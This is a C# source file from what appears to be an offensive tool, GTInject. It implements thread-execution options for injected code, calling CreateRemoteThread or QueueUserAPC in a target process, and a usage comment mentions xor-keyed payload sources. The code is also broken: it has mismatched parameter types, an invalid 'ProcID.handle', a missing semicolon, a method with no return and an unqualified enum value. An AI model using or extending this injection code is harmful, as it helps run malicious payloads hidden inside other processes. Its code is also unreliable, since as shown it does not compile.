using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

namespace GTInject.Injection
{
    internal class threadexec
    {
        public static IntPtr SelectThreadOption(IntPtr memaddr, int execoption, int pid, int tid)
        {
            switch (execoption)
            {
                case 1:
                    return execopt1(memaddr, pid, tid);
                    break;
                case 2:
                    return execopt2(memaddr, pid, tid);
                    break;
                case 3:
                    return IntPtr.Zero;
                    break;
            }
            return IntPtr.Zero;
        }

        private static IntPtr execopt1(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            // //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
            /////////////////////////////////////
            // OPTION 1 == CreateRemoteThread (WINAPI)
            /////////////////////////////////////
            
            IntPtr remoteThreadResp = CreateRemoteThread(ProcID.handle, (IntPtr)0, 0, memaddr, (IntPtr)0, 0, (IntPtr)0);
            return remoteThreadResp;
        }

        private static IntPtr execopt2(IntPtr memaddr, Process ProcID, int ThreadID) 
        {
            /////////////////////////////////////
            // OPTION 2 == QueueUserAPC & ResumeThread
            /////////////////////////////////////
            
            var threadHandle = OpenThread(QUERY_INFORMATION, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
            IntPtr QuApcResp = QueueUserAPC(memaddr, threadHandle, IntPtr.Zero)

            // Test this, recall not needing any additional actions if submitting a thread in the wait states already
            //var ResThreadResp = ResumeThread(threadHandle);
        }

        /////////////////////////////////////
        // Supporting functions
        /////////////////////////////////////


        /////////////////////////////////////
        // PInvokes and Enums / Structures
        /////////////////////////////////////
        [Flags]
        public enum    ThreadAccess : int
        {
            TERMINATE           = (0x0001)  ,
            SUSPEND_RESUME      = (0x0002)  ,
            GET_CONTEXT         = (0x0008)  ,
            SET_CONTEXT         = (0x0010)  ,
            SET_INFORMATION     = (0x0020)  ,
            QUERY_INFORMATION       = (0x0040)  ,
            SET_THREAD_TOKEN    = (0x0080)  ,
            IMPERSONATE         = (0x0100)  ,
            DIRECT_IMPERSONATION    = (0x0200)
        }
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenThread(uint desiredAccess, bool inheritHandle, uint threadId);

        [DllImport("kernel32.dll")]
        public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(IntPtr hThread);

    }
}
